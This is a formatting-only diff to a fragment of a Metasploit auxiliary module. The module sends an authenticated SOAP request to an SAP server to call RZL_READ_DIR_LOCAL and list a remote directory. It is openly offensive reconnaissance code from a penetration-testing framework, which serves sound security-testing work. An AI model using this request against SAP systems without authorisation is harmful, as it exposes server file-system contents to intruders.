@@ -96,18 +96,18 @@ class Metasploit4 < Msf::Auxiliary
     begin
       vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
+        'uri'           => '/sap/bc/soap/rfc',
+        'method'        => 'POST',
+        'data'          => data,
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-        'ctype' => 'text/xml; charset=UTF-8',
-        'headers' => {
+        'cookie'        => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+        'ctype'         => 'text/xml; charset=UTF-8',
+        'headers'       => {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
         },
-        'vars_get' => {
-          'sap-client' => datastore['CLIENT'],
-          'sap-language' => 'EN'
+        'vars_get'      => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
         }
       })
       if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
